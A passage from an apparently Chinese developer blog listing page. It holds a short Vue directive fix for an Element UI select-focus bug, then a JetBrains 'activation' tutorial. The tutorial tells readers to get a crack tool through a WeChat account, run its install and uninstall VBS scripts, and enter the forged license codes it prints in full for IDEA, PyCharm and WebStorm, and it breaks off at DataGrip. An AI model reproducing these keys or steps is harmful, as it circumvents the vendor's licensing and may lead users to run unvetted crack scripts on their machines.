<p><strong>结果：</strong><br>
<img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/6bc844eb01ac4dfc9aa12b8c6ef6d622.jpeg" alt="在这里插入图片描述"></p>
<h2 id="关于我"><a class="markdownIt-Anchor" href="#关于我">#</a> 关于我</h2>
<p>Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png" alt="InterviewCoder"></p>
<p>非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-04-24T01:45:16.000Z" title="2023/4/24 09:45:16">2023-04-24</time>发表</span><span class="level-item"><time dateTime="2021-09-15T16:03:38.000Z" title="2021/9/16 00:03:38">2021-09-16</time>更新</span><span class="level-item">2 分钟读完 (大约265个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/04/24/%E3%80%90Vue%E3%80%91%E4%BF%AE%E5%A4%8Delement%E5%8F%AF%E6%90%9C%E7%B4%A2%E4%B8%8B%E6%8B%89%E6%A1%86%E9%80%89%E4%B8%AD%E9%80%89%E9%A1%B9%EF%BC%8C%E5%88%87%E5%B1%8F%E5%90%8E%EF%BC%8C%E4%BC%9A%E8%87%AA%E5%8A%A8%E8%8E%B7%E5%8F%96%E7%84%A6%E7%82%B9%EF%BC%8C%E8%8F%9C%E5%8D%95%E8%87%AA%E5%8A%A8%E5%BC%B9%E5%87%BA/">【Vue】修复element可搜索下拉框选中选项，切屏后，会自动获取焦点，菜单自动弹出</a></p><div class="content"><p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png" alt="InterviewCoder"></p>
<h1 id="vue修复element可搜索下拉框选中选项切屏后会自动获取焦点菜单自动弹出"><a class="markdownIt-Anchor" href="#vue修复element可搜索下拉框选中选项切屏后会自动获取焦点菜单自动弹出">#</a> 【Vue】修复 element 可搜索下拉框选中选项，切屏后，会自动获取焦点，菜单自动弹出</h1>
<h3 id="1添加自定义指令-v-select-blur"><a class="markdownIt-Anchor" href="#1添加自定义指令-v-select-blur">#</a> 1. 添加自定义指令 v-select-blur</h3>
<h5 id="在mainjs添加"><a class="markdownIt-Anchor" href="#在mainjs添加">#</a> 在 main.js 添加：</h5>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">directive</span>(<span class="string">&#x27;select-blur&#x27;</span>, &#123;</span><br><span class="line">  <span class="title function_">bind</span>(<span class="params">el, binding</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> inputDom = el.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;input&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> (!inputDom) <span class="keyword">return</span> </span><br><span class="line">    <span class="keyword">let</span> isOpen = <span class="literal">false</span></span><br><span class="line">    inputDom.<span class="title function_">addEventListener</span>(<span class="string">&#x27;focus&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (isOpen) &#123;</span><br><span class="line">        inputDom.<span class="title function_">blur</span>()</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        isOpen = <span class="literal">true</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h5 id="用法"><a class="markdownIt-Anchor" href="#用法">#</a> 用法：</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-select</span><br><span class="line">    v-select-blur</span><br><span class="line">    v-model=&quot;value&quot;</span><br><span class="line">    :placeholder=&quot;请选择&quot;</span><br><span class="line">    clearable</span><br><span class="line">    filterable</span><br><span class="line">&gt;</span><br><span class="line"> &lt;el-option</span><br><span class="line">     v-for=&quot;item in countryList&quot;</span><br><span class="line">     :key=&quot;item.id&quot;</span><br><span class="line">     :label=&quot;item.name&quot;</span><br><span class="line">     :value=&quot;item.name&quot;</span><br><span class="line">     :title=&quot;item.name&quot;</span><br><span class="line"> /&gt;</span><br><span class="line">&lt;/el-select&gt;          </span><br></pre></td></tr></table></figure>
<h3 id="存在的问题"><a class="markdownIt-Anchor" href="#存在的问题">#</a> 存在的问题：</h3>
<p>​	虽然有效，但是会导致第二次点下拉框时，无法继续搜索</p>
<h2 id="关于我"><a class="markdownIt-Anchor" href="#关于我">#</a> 关于我</h2>
<p>Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png" alt="InterviewCoder"></p>
<p>非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-04-24T01:32:38.000Z" title="2023/4/24 09:32:38">2023-04-24</time>发表</span><span class="level-item"><time dateTime="2022-02-01T19:08:40.000Z" title="2022/2/2 03:08:40">2022-02-02</time>更新</span><span class="level-item">27 分钟读完 (大约3980个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/04/24/%E3%80%90IDE%E3%80%91Jet%E5%85%A8%E5%AE%B6%E6%A1%B6%E6%BF%80%E6%B4%BB%E6%95%99%E7%A8%8B/">JetBrains全系列激活码</a></p><div class="content"><p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png" alt="InterviewCoder"></p>
<h1 id="jetbrains全系列激活码"><a class="markdownIt-Anchor" href="#jetbrains全系列激活码">#</a> <strong>JetBrains 全系列激活码</strong></h1>
<p>注：不同的软件，需要不同的激活码，千万别复制错了</p>
<h2 id="本文讲的是支持202222最新版本的rubymine破解-rubymine激活码-rubymine安装-rubymine永久激活码的最新永久激活教程本文有mac和windows系统的rubymine安装教程"><a class="markdownIt-Anchor" href="#本文讲的是支持202222最新版本的rubymine破解-rubymine激活码-rubymine安装-rubymine永久激活码的最新永久激活教程本文有mac和windows系统的rubymine安装教程">#</a> 本文讲的是支持 2022.2.2 最新版本的 RubyMine 破解、RubyMine 激活码、RubyMine 安装、RubyMine 永久激活码的最新永久激活教程，本文有 mac 和 windows 系统的 RubyMine 安装教程。</h2>
<p><img src="https://brath.oss-cn-shanghai.aliyuncs.com/pigo/131-21010G6105IL.png" alt="131-21010G6105IL"></p>
<h3 id="1下载你需要的ide工具"><a class="markdownIt-Anchor" href="#1下载你需要的ide工具">#</a> 1. 下载你需要的 IDE 工具</h3>
<h3 id="2下载破解工具-微信公众号搜索interviewcoder或扫码关注公众号回复关键词破解即可获取"><a class="markdownIt-Anchor" href="#2下载破解工具-微信公众号搜索interviewcoder或扫码关注公众号回复关键词破解即可获取">#</a> 2. 下载破解工具 (微信公众号搜索 InterviewCoder) 或扫码关注公众号回复关键词《破解》即可获取</h3>
<p><img src="https://brath.oss-cn-shanghai.aliyuncs.com/pigo/%E4%BA%8C%E7%BB%B4%E7%A0%81mini.png" alt="二维码mini"></p>
<h3 id="3下载好后解压并打开选择scripts"><a class="markdownIt-Anchor" href="#3下载好后解压并打开选择scripts">#</a> 3. 下载好后解压并打开，选择 scripts</h3>
<p><img src="https://brath.oss-cn-shanghai.aliyuncs.com/pigo/sp20220926_173051_163.png" alt="图片[5]-RubyMine破解安装激活教程2022-09-26最新（亲测可用）-不靠谱程序员"></p>
<h3 id="4先执行unistall-current-uservbs直接双击打开此步骤是为了防止之前有过激活信息确保当前环境变量下没有激活工具的变量信息可先执行卸载脚本在再进行后面的激活操作避免激活失败"><a class="markdownIt-Anchor" href="#4先执行unistall-current-uservbs直接双击打开此步骤是为了防止之前有过激活信息确保当前环境变量下没有激活工具的变量信息可先执行卸载脚本在再进行后面的激活操作避免激活失败">#</a> 4. 先执行 unistall-current-user.vbs, 直接双击打开，此步骤是为了防止之前有过激活信息，确保当前环境变量下没有激活工具的变量信息，可先执行卸载脚本在再进行后面的激活操作，避免激活失败。</h3>
<p><img src="https://brath.oss-cn-shanghai.aliyuncs.com/pigo/sp20220926_173124_742-1024x464.png" alt="图片[8]-RubyMine破解安装激活教程2022-09-26最新（亲测可用）-不靠谱程序员"></p>
<ul>
<li>出现弹框 done 说明成功</li>
<li><img src="https://brath.oss-cn-shanghai.aliyuncs.com/pigo/sp20220926_173141_329.png" alt="图片[9]-RubyMine破解安装激活教程2022-09-26最新（亲测可用）-不靠谱程序员"></li>
<li>然后再执行 install-current-user.vbs, 直接双击打开即可</li>
<li><img src="https://brath.oss-cn-shanghai.aliyuncs.com/pigo/sp20220926_173154_884-1024x512.png" alt="图片[10]-RubyMine破解安装激活教程2022-09-26最新（亲测可用）-不靠谱程序员"></li>
<li>这里需要等待 10 秒左右才会出现第二个 done 弹框，才是成功</li>
<li><img src="https://brath.oss-cn-shanghai.aliyuncs.com/pigo/sp20220926_173214_384-300x267.png" alt="图片[11]-RubyMine破解安装激活教程2022-09-26最新（亲测可用）-不靠谱程序员"></li>
</ul>
<h3 id="5然后再输入对应的激活码即可"><a class="markdownIt-Anchor" href="#5然后再输入对应的激活码即可">#</a> 5. 然后再输入对应的激活码即可！！！！</h3>
<h2 id="idea专用"><a class="markdownIt-Anchor" href="#idea专用">#</a> <strong>IDEA 专用</strong></h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XIZQAN09CR-eyJsaWNlbnNlSWQiOiJYSVpRQU4wOUNSIiwibGljZW5zZWVOYW1lIjoia2lkZHkgaW5zZWFtcyIsImFzc2lnbmVlTmFtZSI6IiIsImFzc2lnbmVlRW1haWwiOiIiLCJsaWNlbnNlUmVzdHJpY3Rpb24iOiIiLCJjaGVja0NvbmN1cnJlbnRVc2UiOmZhbHNlLCJwcm9kdWN0cyI6W3siY29kZSI6IlBEQiIsImZhbGxiYWNrRGF0ZSI6IjIwMjUtMDgtMDEiLCJwYWlkVXBUbyI6IjIwMjUtMDgtMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUFNJIiwiZmFsbGJhY2tEYXRlIjoiMjAyNS0wOC0wMSIsInBhaWRVcFRvIjoiMjAyNS0wOC0wMSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQUEMiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBDV01QIiwiZmFsbGJhY2tEYXRlIjoiMjAyNS0wOC0wMSIsInBhaWRVcFRvIjoiMjAyNS0wOC0wMSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQUkIiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBQUyIsImZhbGxiYWNrRGF0ZSI6IjIwMjUtMDgtMDEiLCJwYWlkVXBUbyI6IjIwMjUtMDgtMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiSUkiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJQR08iLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBTVyIsImZhbGxiYWNrRGF0ZSI6IjIwMjUtMDgtMDEiLCJwYWlkVXBUbyI6IjIwMjUtMDgtMDEiLCJleHRlbmRlZCI6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</span><br></pre></td></tr></table></figure>
<h2 id="pycharm专用"><a class="markdownIt-Anchor" href="#pycharm专用">#</a> <strong>PyCharm 专用</strong></h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WDV7B5UM4J-eyJsaWNlbnNlSWQiOiJXRFY3QjVVTTRKIiwibGljZW5zZWVOYW1lIjoia2lkZHkgaW5zZWFtcyIsImFzc2lnbmVlTmFtZSI6IiIsImFzc2lnbmVlRW1haWwiOiIiLCJsaWNlbnNlUmVzdHJpY3Rpb24iOiIiLCJjaGVja0NvbmN1cnJlbnRVc2UiOmZhbHNlLCJwcm9kdWN0cyI6W3siY29kZSI6IlBTSSIsImZhbGxiYWNrRGF0ZSI6IjIwMjUtMDgtMDEiLCJwYWlkVXBUbyI6IjIwMjUtMDgtMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUFBDIiwiZmFsbGJhY2tEYXRlIjoiMjAyNS0wOC0wMSIsInBhaWRVcFRvIjoiMjAyNS0wOC0wMSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQQ1dNUCIsImZhbGxiYWNrRGF0ZSI6IjIwMjUtMDgtMDEiLCJwYWlkVXBUbyI6IjIwMjUtMDgtMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUEMiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJQV1MiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9XSwibWV0YWRhdGEiOiIwMTIwMjIwODAxUFNBTjAwMDAwNSIsImhhc2giOiJUUklBTDoyNjMyMTUzOTMiLCJncmFjZVBlcmlvZERheXMiOjcsImF1dG9Qcm9sb25nYXRlZCI6ZmFsc2UsImlzQXV0b1Byb2xvbmdhdGVkIjpmYWxzZX0=-S44u4zyBrYbltQAZezyCkBYsVU9HRftkKneJSWd2SsZMxgJiA1JfkhEl2yc4zrXBBqCCn2PKpaw8noyremrYtur0Iz93xp1geS6VSI4t5w5jgHR1CEUcL9Ia4BIl3CIMkxR3WXPrSGAt9jVitTmmCGGO9swTN4Hxey4iNNsEhkp8LDG949kRhN1ly00RH+p+rUP+FdVxwZ7e06rIV1c/8MGoJi4Z+7oyi+WnfIP+QIwxoNa60dzshI9Ep9d0p6bIR6eBKbNkfooWmp87mpOyN5QPupwF4q1KgS+LbFTeY/zZK6yP7tj+T2rbE3WI8MhnIviArGLs9DjZm20MwZTWvg==-MIIETDCCAjSgAwIBAgIBDTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTIwMTAxOTA5MDU1M1oXDTIyMTAyMTA5MDU1M1owHzEdMBsGA1UEAwwUcHJvZDJ5LWZyb20tMjAyMDEwMTkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCUlaUFc1wf+CfY9wzFWEL2euKQ5nswqb57V8QZG7d7RoR6rwYUIXseTOAFq210oMEe++LCjzKDuqwDfsyhgDNTgZBPAaC4vUU2oy+XR+Fq8nBixWIsH668HeOnRK6RRhsr0rJzRB95aZ3EAPzBuQ2qPaNGm17pAX0Rd6MPRgjp75IWwI9eA6aMEdPQEVN7uyOtM5zSsjoj79Lbu1fjShOnQZuJcsV8tqnayeFkNzv2LTOlofU/Tbx502Ro073gGjoeRzNvrynAP03pL486P3KCAyiNPhDs2z8/COMrxRlZW5mfzo0xsK0dQGNH3UoG/9RVwHG4eS8LFpMTR9oetHZBAgMBAAGjgZkwgZYwCQYDVR0TBAIwADAdBgNVHQ4EFgQUJNoRIpb1hUHAk0foMSNM9MCEAv8wSAYDVR0jBEEwP4AUo562SGdCEjZBvW3gubSgUouX8bOhHKQaMBgxFjAUBgNVBAMMDUpldFByb2ZpbGUgQ0GCCQDSbLGDsoN54TATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBaAwDQYJKoZIhvcNAQELBQADggIBABqRoNGxAQct9dQUFK8xqhiZaYPd30TlmCmSAaGJ0eBpvkVeqA2jGYhAQRqFiAlFC63JKvWvRZO1iRuWCEfUMkdqQ9VQPXziE/BlsOIgrL6RlJfuFcEZ8TK3syIfIGQZNCxYhLLUuet2HE6LJYPQ5c0jH4kDooRpcVZ4rBxNwddpctUO2te9UU5/FjhioZQsPvd92qOTsV+8Cyl2fvNhNKD1Uu9ff5AkVIQn4JU23ozdB/R5oUlebwaTE6WZNBs+TA/qPj+5/we9NH71WRB0hqUoLI2AKKyiPw++FtN4Su1vsdDlrAzDj9ILjpjJKA1ImuVcG329/WTYIKysZ1CWK3zATg9BeCUPAV1pQy8ToXOq+RSYen6winZ2OO93eyHv2Iw5kbn1dqfBw1BuTE29V2FJKicJSu8iEOpfoafwJISXmz1wnnWL3V/0NxTulfWsXugOoLfv0ZIBP1xH9kmf22jjQ2JiHhQZP7ZDsreRrOeIQ/c4yR8IQvMLfC0WKQqrHu5ZzXTH4NO3CwGWSlTY74kE91zXB5mwWAx1jig+UXYc2w4RkVhy0//lOmVya/PEepuuTTI4+UJwC7qbVlh5zfhj8oTNUXgN0AOc+Q0/WFPl1aw5VV/VrO8FCoB15lFVlpKaQ1Yh+DVU8ke+rt9Th0BCHXe0uZOEmH0nOnH/0onD</span><br></pre></td></tr></table></figure>
<h2 id="webstorm专用"><a class="markdownIt-Anchor" href="#webstorm专用">#</a> <strong>Webstorm 专用</strong></h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QA01VSISIH-eyJsaWNlbnNlSWQiOiJRQTAxVlNJU0lIIiwibGljZW5zZWVOYW1lIjoia2lkZHkgaW5zZWFtcyIsImFzc2lnbmVlTmFtZSI6IiIsImFzc2lnbmVlRW1haWwiOiIiLCJsaWNlbnNlUmVzdHJpY3Rpb24iOiIiLCJjaGVja0NvbmN1cnJlbnRVc2UiOmZhbHNlLCJwcm9kdWN0cyI6W3siY29kZSI6IldTIiwiZmFsbGJhY2tEYXRlIjoiMjAyNS0wOC0wMSIsInBhaWRVcFRvIjoiMjAyNS0wOC0wMSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUFNJIiwiZmFsbGJhY2tEYXRlIjoiMjAyNS0wOC0wMSIsInBhaWRVcFRvIjoiMjAyNS0wOC0wMSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQQ1dNUCIsImZhbGxiYWNrRGF0ZSI6IjIwMjUtMDgtMDEiLCJwYWlkVXBUbyI6IjIwMjUtMDgtMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUFdTIiwiZmFsbGJhY2tEYXRlIjoiMjAyNS0wOC0wMSIsInBhaWRVcFRvIjoiMjAyNS0wOC0wMSIsImV4dGVuZGVkIjp0cnVlfV0sIm1ldGFkYXRhIjoiMDEyMDIyMDgwMVBTQU4wMDAwMDUiLCJoYXNoIjoiVFJJQUw6MTg0ODI4OTEzMCIsImdyYWNlUGVyaW9kRGF5cyI6NywiYXV0b1Byb2xvbmdhdGVkIjpmYWxzZSwiaXNBdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlfQ==-PqVYTlv/yp1AaLCz/i/e//sf0n6LD6uvJTy7/jl9F2A3RJjjMvWCDeCx8tK8PZep5I+GosApeiQdzkv7aG/TfjJRiHzdF0PgJaATxwaf9hDQx7fWT2zALtrOqT89C0Qe/OsLKM9mSFm9y5ul4JW7MQSfCDMtm8B8fUQ5ZFu0nB3XcI4YnMPDjKGaifDUdY2B0u7k29CQ4JLnYxC8HL4644GG+T8F+mNkOoDDNTSE8LmcEKWXYKPzD+YEJ5flLyHc5OVtYDPF2MQ/wsbwMVf7l1O22pkr8jKdyHLzbtaeIXojlOI8fvqnXSSetFmdMa/eRC0kHHf42BZ7VQ8etd599g==-MIIETDCCAjSgAwIBAgIBDTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTIwMTAxOTA5MDU1M1oXDTIyMTAyMTA5MDU1M1owHzEdMBsGA1UEAwwUcHJvZDJ5LWZyb20tMjAyMDEwMTkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCUlaUFc1wf+CfY9wzFWEL2euKQ5nswqb57V8QZG7d7RoR6rwYUIXseTOAFq210oMEe++LCjzKDuqwDfsyhgDNTgZBPAaC4vUU2oy+XR+Fq8nBixWIsH668HeOnRK6RRhsr0rJzRB95aZ3EAPzBuQ2qPaNGm17pAX0Rd6MPRgjp75IWwI9eA6aMEdPQEVN7uyOtM5zSsjoj79Lbu1fjShOnQZuJcsV8tqnayeFkNzv2LTOlofU/Tbx502Ro073gGjoeRzNvrynAP03pL486P3KCAyiNPhDs2z8/COMrxRlZW5mfzo0xsK0dQGNH3UoG/9RVwHG4eS8LFpMTR9oetHZBAgMBAAGjgZkwgZYwCQYDVR0TBAIwADAdBgNVHQ4EFgQUJNoRIpb1hUHAk0foMSNM9MCEAv8wSAYDVR0jBEEwP4AUo562SGdCEjZBvW3gubSgUouX8bOhHKQaMBgxFjAUBgNVBAMMDUpldFByb2ZpbGUgQ0GCCQDSbLGDsoN54TATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBaAwDQYJKoZIhvcNAQELBQADggIBABqRoNGxAQct9dQUFK8xqhiZaYPd30TlmCmSAaGJ0eBpvkVeqA2jGYhAQRqFiAlFC63JKvWvRZO1iRuWCEfUMkdqQ9VQPXziE/BlsOIgrL6RlJfuFcEZ8TK3syIfIGQZNCxYhLLUuet2HE6LJYPQ5c0jH4kDooRpcVZ4rBxNwddpctUO2te9UU5/FjhioZQsPvd92qOTsV+8Cyl2fvNhNKD1Uu9ff5AkVIQn4JU23ozdB/R5oUlebwaTE6WZNBs+TA/qPj+5/we9NH71WRB0hqUoLI2AKKyiPw++FtN4Su1vsdDlrAzDj9ILjpjJKA1ImuVcG329/WTYIKysZ1CWK3zATg9BeCUPAV1pQy8ToXOq+RSYen6winZ2OO93eyHv2Iw5kbn1dqfBw1BuTE29V2FJKicJSu8iEOpfoafwJISXmz1wnnWL3V/0NxTulfWsXugOoLfv0ZIBP1xH9kmf22jjQ2JiHhQZP7ZDsreRrOeIQ/c4yR8IQvMLfC0WKQqrHu5ZzXTH4NO3CwGWSlTY74kE91zXB5mwWAx1jig+UXYc2w4RkVhy0//lOmVya/PEepuuTTI4+UJwC7qbVlh5zfhj8oTNUXgN0AOc+Q0/WFPl1aw5VV/VrO8FCoB15lFVlpKaQ1Yh+DVU8ke+rt9Th0BCHXe0uZOEmH0nOnH/0onD</span><br></pre></td></tr></table></figure>
<h2 id="datagrip专用"><a class="markdownIt-Anchor" href="#datagrip专用">#</a> <strong>DataGrip 专用</strong></h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 